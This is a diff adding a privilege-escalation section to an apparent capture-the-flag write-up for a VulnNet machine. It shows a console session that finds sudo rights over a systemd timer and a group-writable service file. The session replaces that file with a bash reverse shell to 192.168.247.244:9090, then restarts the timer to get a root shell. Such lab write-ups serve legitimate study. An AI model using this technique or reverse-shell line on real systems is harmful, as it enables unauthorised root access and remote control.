@@ -46,3 +46,59 @@ app.get('/login', function(req, res) {
 });
 app.listen(8080);
 ```
+
+---
+
+priv esc
+
+```console
+serv-manage@ip-10-48-138-121:~$ sudo -l
+sudo -l
+Matching Defaults entries for serv-manage on ip-10-48-138-121:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User serv-manage may run the following commands on ip-10-48-138-121:
+    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
+    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
+    (root) NOPASSWD: /bin/systemctl daemon-reload
+    
+serv-manage@ip-10-48-138-121:~$ systemctl cat vulnnet-auto.timer
+systemctl cat vulnnet-auto.timer
+# /etc/systemd/system/vulnnet-auto.timer
+[Unit]
+Description=Run VulnNet utilities every 30 min
+
+[Timer]
+OnBootSec=0min
+# 30 min job
+OnCalendar=*:0/30
+Unit=vulnnet-job.service
+
+[Install]
+WantedBy=basic.target
+
+serv-manage@ip-10-48-138-121:~$ ls -l /etc/systemd/system/vulnnet-job.service
+ls -l /etc/systemd/system/vulnnet-job.service
+-rw-rw-r-- 1 root serv-manage 197 May 28 08:36 /etc/systemd/system/vulnnet-job.service
+
+serv-manage@ip-10-48-138-121:~$ cat > /etc/systemd/system/vulnnet-job.service <<'EOF'
+[Unit]
+Description=Logs system statistics to the systemd journal
+Wants=vulnnet-auto.timer
+
+[Service]
+Type=forking
+ExecStart=/bin/bash -c 'sh -i >& /dev/tcp/192.168.247.244/9090 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+serv-manage@ip-10-48-138-121:~$ sudo -u root /bin/systemctl daemon-reload
+sudo -u root /bin/systemctl daemon-reload
+serv-manage@ip-10-48-138-121:~$ sudo /bin/systemctl stop vulnnet-auto.timer
+sudo /bin/systemctl stop vulnnet-auto.timer
+serv-manage@ip-10-48-138-121:~$ sudo /bin/systemctl start vulnnet-auto.timer   
+sudo /bin/systemctl start vulnnet-auto.timer
+```
